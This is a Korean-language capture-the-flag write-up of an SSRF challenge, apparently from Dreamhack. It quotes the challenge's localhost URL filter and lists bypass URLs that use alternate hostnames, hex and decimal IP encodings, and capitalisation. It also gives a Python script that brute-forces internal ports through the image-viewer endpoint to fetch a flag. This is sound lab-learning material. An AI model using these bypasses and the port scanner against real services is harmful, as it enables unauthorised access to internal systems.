아주 재미있고 흥미로운 ssrf 문제이다 
여기서 알게된 가장 중요한 한 가지는 
리플에서 가동해도 콘솔이 아니라 shell로 가동하면 
포트값을 정확히 지정할 수 있어서 원하는 계산이 가능하다는 것이었다 
보통 쉘 코드로 파이썬 침투하는 경우에 (내 생각이 맞다면 일단 웹의 경우에) 
리플에 있는 shell로도 가능하다는 것을 알 수 있었다 
참고로 리플로 pwntools를 활용한 익스플로잇 등도 가능하다 

shell로 값을 브포한다음 
http://Localhost:1760/flag.txt로 들어가면 (브포 값은 저마다 다르다) 
REh7NDNkZDIxODkwNTY0Nz......2FkNzF9 이 값이 나오는데 
이 값을 base64로 디코딩하면 DH{43d....} 이렇게 나온다 


이 문제가 원하는 조건은 대략 세 가지로 볼 수 있는데 
1 Localhost  2 포트번호  3 /flag.txt 
이 세가지이다 실제로 이 세가지를 정확히 원하는 순서대로 써주면 원하는 플래그이다 

이번에 다시 공부하면서 새롭게 알게 된 부분은 
if url[0] == "/":
            url = "http://localhost:8000" + url
        # URL 필터링
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc): 
            data = open("error.png", "rb").read() 
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
            
원래 프로그램 본문에 위와 같은 url 필터링이 있다는 사실이었다. 
http://vcap.me:8000/
http://0x7f.0x00.0x00.0x01:8000/
http://0x7f000001:8000/
http://2130706433:8000/
http://Localhost:8000/
http://127.0.0.255:8000/
등을 통해서 들어가면 
<!doctype html> 관련된 내용이 나온다 (base64 복호화) 
아마도 내 생각에는 이 내용이 중요한 이유는 1번 조건을 충족해주기 때문인 거 같다
왜냐하면, http://localhost:8000/로 치면 not found 가 뜨기 때문이다. 
이 말의 의미는 localhost에 대해서 url 필터링을 하고 있다는 위의 내용과 정확히
일치한다. 따라서 localhost가 아닌 Localhost로 적어야 함을 역설하고 있는 것이다. 


#!/usr/bin/python3
import requests
import sys
from tqdm import tqdm
# `src` value of "NOT FOUND X"
NOTFOUND_IMG = "iVBORw0KG"
def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text
def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port
if __name__ == "__main__":
    chall_port = int(sys.argv[1])
    chall_url = f"http://host1.dreamhack.games:{chall_port}/img_viewer"
    internal_port = find_port()

그 다음 부분은 바로 이 내용인데 이 문제의 하이라이트이다 
이 내용을 이용해서 replit 환경에서 shell 명령어를 사용하는 것이 주요하다고 말할 수 있다 
그 기본적인 답은 위에 적어 두었다. 
이런 식으로 port값까지 구하게 되면 
http://Localhost:port값/flag.txt  (/flag.txt는 문제 조건에 적혀있다) 를 image viewer에 치면 
원하는 플래그가 나오고 문제가 해결된다.  (위에서 말한 세 가지 조건이 모두 해결되었다!)
